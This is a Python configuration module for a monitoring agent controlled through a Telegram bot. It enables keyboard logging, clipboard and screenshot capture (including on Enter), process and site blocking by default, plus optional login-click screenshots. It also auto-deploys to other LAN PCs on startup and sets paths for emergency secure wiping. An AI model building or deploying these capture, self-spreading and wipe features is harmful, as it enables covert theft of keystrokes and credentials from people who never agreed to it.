"""Local persistent config for the agent (encrypted at rest)."""
from __future__ import annotations

import hashlib
import os
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Optional

from .crypto import SecureStorage


def _config_dir() -> Path:
    base = os.environ.get("LOCALAPPDATA") or os.path.expanduser("~")
    p = Path(base) / "MonitorAgent"
    p.mkdir(parents=True, exist_ok=True)
    return p


CONFIG_DIR = _config_dir()
_storage = SecureStorage(CONFIG_DIR / "config.enc", extra_seed="monitor-v2")


@dataclass
class LocalConfig:
    # Telegram
    bot_token: str = ""
    admin_id: int = 0  # Telegram user ID of the admin

    # Legacy server (optional, can be empty)
    server_url: str = ""
    agent_token: Optional[str] = None
    agent_id: Optional[int] = None

    # State
    consented: bool = False
    paused: bool = False
    setup_complete: bool = False

    # Protection
    exit_password_hash: str = ""  # SHA-256 of exit password

    # Features
    screenshot_interval: int = 60  # seconds, 0 = off
    tracking_enabled: bool = True
    block_enabled: bool = True
    usb_monitor_enabled: bool = True
    clipboard_monitor_enabled: bool = True
    software_monitor_enabled: bool = True
    keylogger_enabled: bool = True  # keyboard logging
    auto_screenshot_enabled: bool = True  # screenshot on Enter key
    auto_screenshot_mouse_enabled: bool = False  # screenshot on important mouse clicks (OK, Login, etc.)
    blocked_processes: list[str] = field(default_factory=list)
    blocked_sites: list[str] = field(default_factory=list)
    wipe_paths: list[str] = field(default_factory=list)  # paths for emergency secure wipe
    auto_deploy_enabled: bool = True  # auto-discover and deploy to LAN PCs on startup

    def save(self) -> None:
        _storage.save(asdict(self))

    @classmethod
    def load(cls) -> "LocalConfig":
        data = _storage.load()
        if not data:
            return cls()
        cfg = cls()
        for k, v in data.items():
            if hasattr(cfg, k):
                setattr(cfg, k, v)
        return cfg

    @classmethod
    def exists(cls) -> bool:
        return _storage.exists()

    def set_exit_password(self, password: str) -> None:
        self.exit_password_hash = hashlib.sha256(password.encode()).hexdigest()

    def check_exit_password(self, password: str) -> bool:
        if not self.exit_password_hash:
            return True
        return hashlib.sha256(password.encode()).hexdigest() == self.exit_password_hash

    @property
    def is_configured(self) -> bool:
        return bool(self.bot_token) and self.admin_id > 0 and self.setup_complete
